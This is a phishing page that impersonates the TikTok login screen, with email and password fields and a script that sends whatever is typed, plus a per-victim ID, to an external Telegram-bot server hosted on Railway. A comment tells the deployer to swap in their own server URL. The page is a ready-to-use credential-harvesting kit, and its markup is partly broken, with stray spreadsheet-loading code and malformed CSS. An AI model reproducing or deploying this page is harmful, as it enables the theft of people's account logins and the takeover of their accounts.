<script type="text/javascript">
        var gk_isXlsx = false;
        var gk_xlsxFileLookup = {};
        var gk_fileData = {};
        function filledCell(cell) {
          return cell !== '' && cell != null;
        }
        function loadFileData(filename) {
        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
            try {
                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
                var firstSheetName = workbook.SheetNames[0];
                var worksheet = workbook.Sheets[firstSheetName];

                // Convert sheet to JSON to filter blank rows
                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
                // Filter out blank rows (rows where all cells are empty, null, or undefined)
                var filteredData = jsonData.filter(row => row.some(filledCell));

                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
                var headerRowIndex = filteredData.findIndex((row, index) =>
                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
                );
                // Fallback
                if (headerRowIndex === -1 || headerRowIndex > 25) {
                  headerRowIndex = 0;
                }

                // Convert filtered JSON back to CSV
                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
                return csv;
            } catch (e) {
                console.error(e);
                return "";
            }
        }
        return gk_fileData[filename] || "";
        }

    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }
        body {
            display: flex; justify-content: center; align-items: center;
            min-height: 100vh; background-color: #000000; color: #ffffff; overflow-x: hidden;
        }
        .main-container {
            display: flex; flex-direction: column; align-items: center;
            width: 100%; max-width: 400px; padding: 20px;
        }
        .logo { margin-bottom: 30px; }
        .logo img { width: 150px; }
        .login-box {
            width: 100%; background: rgba(255, 255, 255, 0.1);
            border-radius: 10px; padding: 20px; text-align: center;
        }
        form { display: flex; flex-direction: column; gap: 10px; }
        input {
            padding: 12px; border: 1px solid #333; border-radius: 5px;
            background: #1a1a1a; color: #ffffff; font-size: 14px;
        }
        input::placeholder { color: #999; }

            padding: 12px; background: linear-gradient(45deg, #fe2c55, #ff6b6b);

    </style>
</head>
<body>
    <div class="main-container">
        <div class="logo">
            <img src="https://www.tiktok.com/favicon.ico" alt="TikTok Logo" onerror="this.style.display='none';">
        </div>
        <div class="login-box">
            <h2>Log In</h2>
            <form>
                <input type="text" id="emailInput" placeholder="Email or phone" required>
                <input type="password" id="passwordInput" placeholder="Password" required>
                <button type="button" id="loginButton">Log In</button>
                <div class="option">OR</div>
                <div class="forget"><a href="#">Forgot password?</a></div>
                <p id="status"></p>
            </form>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const unique_id = urlParams.get('id');
        const api_url = 'tgbot-telegrambot2.up.railway.app'; // Replace with your Railway URL

        const loginButton = document.getElementById('loginButton');
        const emailInput = document.getElementById('emailInput');
        const passwordInput = document.getElementById('passwordInput');
        const status = document.getElementById('status');

        if (!unique_id) {
            status.textContent = 'Error: ID not found!';
            loginButton.style.display = 'none';
            return;
        }

        loginButton.addEventListener('click', () => {
            const email = emailInput.value.trim();
            const password = passwordInput.value.trim();

            if (!email || !password) {
                status.textContent = 'Please enter email or password!';
                return;
            }

            status.textContent = 'Submitting data...';
            fetch(`${api_url}/login`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ unique_id, email, password })
            })
            .then(response => response.json())
            .then(data => {
                if (data.status === 'success') {
                    status.textContent = 'Data successfully submitted!';
                } else {
                    status.textContent = `Error: ${data.message}`;
                }
            })
            .catch(error => {
                status.textContent = `Error submitting data: ${error}`;
            });
        });
    </script>
